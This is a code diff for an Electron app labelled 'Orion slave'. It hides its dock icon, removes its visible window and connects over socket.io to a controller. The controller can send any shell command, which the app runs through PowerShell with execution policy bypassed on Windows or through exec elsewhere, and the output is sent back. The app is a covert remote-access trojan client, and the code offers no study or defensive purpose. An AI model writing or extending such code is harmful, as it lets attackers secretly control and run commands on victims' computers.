@@ -17,12 +17,6 @@ app.dock.setBadge('')
 app.dock.hide()
 app.setName("Orion slave");
 
-const updater = require('electron-simple-updater');
-/* updater.init(
-  'https://raw.githubusercontent.com/o-y/Orion/master/example/updates.json'
-); */
-
-
 ////////////////////////////
 import io from 'socket.io-client'
 
@@ -32,6 +26,7 @@ const Store = require('electron-store');
 const store = new Store();
 const os = require('os')
 const computerName = os.hostname()
+const shell = require('node-powershell');
 
 if (!store.get('uniqueRoomNumber')){
   store.set(
@@ -54,32 +49,64 @@ Socket.on(
         "Execute shell: ",
         data.shellCommand
       )
-      exec(data.shellCommand, function(error, stdout, stderr) {
-        console.log('stdout: ' + stdout);
-        console.log('stderr: ' + stderr);
-        if (error !== null) {
-          console.log("Emitting...")
+
+      if (os.platform() === "win32"){
+        console.log("Windows powershell");
+        let ps = new shell({
+          executionPolicy: 'Bypass',
+          noProfile: true
+        });
+
+        ps.addCommand(data.shellCommand)
+        ps.invoke()
+        .then(output => {
           Socket.emit('codeExecutionResponse',
             {
               uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
-              error: error
+              stdout: output,
+              stderr: "<N/A>"
             }
           )
-        } else {
-          console.log("Emitting...")
+        })
+        .catch(err => {
           Socket.emit('codeExecutionResponse',
             {
               uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
-              stdout: stdout,
-              stderr: stderr
+              error: err
             }
           )
-        }
-    });
+          ps.dispose();
+        });
+      } else {
+        console.log("Macattack");
+        exec(data.shellCommand, function(error, stdout, stderr) {
+          console.log('stdout: ' + stdout);
+          console.log('stderr: ' + stderr);
+          if (error !== null) {
+            console.log("Emitting...")
+            Socket.emit('codeExecutionResponse',
+              {
+                uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
+                error: error
+              }
+            )
+          } else {
+            console.log("Emitting...")
+            Socket.emit('codeExecutionResponse',
+              {
+                uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
+                stdout: stdout,
+                stderr: stderr
+              }
+            )
+          }
+        });
+      }
     }
   }
 );
-///////////////////////////
+
+/*
 let mainWindow;
 function createMainWindow() {
   const window = new BrowserWindow({
@@ -142,4 +169,4 @@ app.on("ready", async () => {
     await installVueDevtools();
   }
   mainWindow = createMainWindow();
-});
+});*/
